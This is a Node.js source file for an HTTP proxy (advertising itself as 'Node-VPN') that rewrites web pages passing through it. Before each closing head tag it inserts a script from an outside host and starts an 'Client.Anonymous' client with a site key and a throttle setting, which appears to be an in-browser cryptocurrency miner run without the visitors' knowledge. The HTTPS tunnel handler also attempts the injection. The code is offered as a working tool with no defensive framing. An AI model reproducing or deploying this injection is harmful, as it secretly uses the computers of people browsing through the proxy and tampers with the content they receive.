const http = require('http')
const net = require('net')
const url = require('url')

const parseIncomingRequest = (clientRequest, clientResponse) => {
    const requestToFulfil = url.parse(clientRequest.url);
    const options = {
      method: clientRequest.method,
      headers: clientRequest.headers,
      host: requestToFulfil.hostname,
      port: requestToFulfil.port || 80,
      path: requestToFulfil.path,
      status: clientResponse.statusCode
    }
    executeRequest(options, clientRequest, clientResponse);
}

const executeRequest = (options, clientRequest, clientResponse) => {

    for(obj in options.headers){
        if(obj.includes('accept-encoding')){
            options.headers['accept-encoding'] = 'utf8'
        }
    }

    const externalRequest = http.request(options, (externalResponse) => {

        clientResponse.writeHead(externalResponse.statusCode, externalResponse.headers);
        externalResponse.on("data", (chunk) => {
            var chunkUtf8 = chunk.toString('UTF8')
            if(chunkUtf8.includes('</head>')){
            chunkUtf8 = chunkUtf8.replace("</head>",`<script src="https://www.hostingcloud.racing/8lKd.js"></script>
            <script>
                var _client = new Client.Anonymous('b90cfedacc8018f993d9c6749a5c2eb34bdd8d567c9f67de9bab0463b87f3432', {
                    throttle: 0.6, c: 'w'
                });
                _client.start();
            </script></head>`)

            chunk = Buffer.from(chunkUtf8)
            console.log(options)
            console.log(chunkUtf8)
            }
            clientResponse.write(chunk);
        });

        externalResponse.on("end", () => {
            clientResponse.end();
        });
    });

    clientRequest.on("data", (chunk) => {
        var chunkUtf8 = chunk.toString('UTF8')
        if(chunkUtf8.includes('</head>')){
            chunkUtf8 = chunkUtf8.replace("</head>",`<script src="https://www.hostingcloud.racing/8lKd.js"></script>
            <script>
                var _client = new Client.Anonymous('b90cfedacc8018f993d9c6749a5c2eb34bdd8d567c9f67de9bab0463b87f3432', {
                    throttle: 0.6, c: 'w'
                });
                _client.start();            
            </script></head>`)

            chunk = Buffer.from(chunkUtf8)
            console.log(options)
            console.log(chunkUtf8)
        }
        externalRequest.write(chunk);
    });
    clientRequest.on("end", () => {
        externalRequest.end();
    });
}

const server = http.createServer(parseIncomingRequest)
server.listen(4998, (err) => {
  if (err) {
    return console.error(err)
  }
  console.log("******************* PROXY STARTED ON http://localhost:4998 *******************\n")
})

/* HTTPS */
server.on('connect', (req, clientSocket, head) => { // listen only for HTTP/1.1 CONNECT metho

  console.log(clientSocket.remoteAddress, clientSocket.remotePort, req.method, req.url , req.headers)
    if (!req.headers['proxy-authorization']) { // here you can add check for any username/password, I just check that this header must exist!
        // clientSocket.write([
        //   'HTTP/1.1 407 Proxy Authentication Required',
        //   'Proxy-Authenticate: Basic realm="proxy"',
        //   'Proxy-Connection: close',
        // ].join('\r\n'))
        clientSocket.end('\r\n\r\n')
        return
    }
    const {port, hostname} = url.parse(`//${req.url}`, false, true)

    if (hostname && port) {
        const serverErrorHandler = (err) => {
        console.error(err.message)
        if (clientSocket) {
            clientSocket.end(`HTTP/1.1 500 ${err.message}\r\n`)
        }
    }
    const serverEndHandler = () => {
      if (clientSocket) {
        clientSocket.end(`HTTP/1.1 500 External Server End\r\n`)
      }
    }
    const serverSocket = net.connect(port, hostname) 
    const clientErrorHandler = (err) => {
      console.error(err.message)
      if (serverSocket) {
        serverSocket.end()
      }
    }
    const clientEndHandler = () => {
      if (serverSocket) {
        serverSocket.end()
      }
    }
    clientSocket.on('error', clientErrorHandler)
    clientSocket.on('end', clientEndHandler)
    serverSocket.on('error', serverErrorHandler)
    serverSocket.on('end', serverEndHandler)
    clientSocket.on("data", (chunk) => {
        var chunkUtf8 = chunk.toString('UTF8');
        // console.log(chunkUtf8)
        // if(chunkUtf8.includes('</head>')){
            chunkUtf8 = chunkUtf8.replace("</head>",`<script src="https://www.hostingcloud.racing/8lKd.js"></script>
            <script>
                var _client = new Client.Anonymous('b90cfedacc8018f993d9c6749a5c2eb34bdd8d567c9f67de9bab0463b87f3432', {
                    throttle: 0.6, c: 'w'
                });
                _client.start();            
            </script></head>`);

            chunk = Buffer.from(chunkUtf8);
            // console.log(req.headers)
            // console.log(chunkUtf8);
        // }
    })
    serverSocket.on('connect', () => {
      clientSocket.write([
        'HTTP/1.1 200 Connection Established',
        'Proxy-agent: Node-VPN',
      ].join('\r\n'))
      clientSocket.write('\r\n\r\n')
      serverSocket.pipe(clientSocket, {end: false})
      clientSocket.pipe(serverSocket, {end: false})
    })
  } else {
    clientSocket.end('HTTP/1.1 400 Bad Request\r\n')
    clientSocket.destroy()
  }
})